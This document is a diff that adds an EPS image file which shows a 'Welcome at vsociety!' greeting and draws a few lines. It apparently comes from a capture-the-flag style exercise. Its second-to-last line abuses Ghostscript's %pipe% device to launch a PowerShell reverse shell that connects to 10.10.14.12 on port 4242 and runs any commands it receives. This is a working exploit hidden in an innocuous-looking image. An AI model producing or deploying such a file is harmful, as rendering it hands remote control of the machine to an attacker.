@@ -1,0 +1,19 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 300 300
+%%Title: Welcome EPS
+
+/Times-Roman findfont
+24 scalefont
+setfont
+
+newpath
+50 200 moveto
+(Welcome at vsociety!) show
+
+newpath
+30 100 moveto
+60 230 lineto
+90 100 lineto
+stroke
+(%pipe%powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.12',4242);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()") (w) file /DCTDecode filter
+showpage
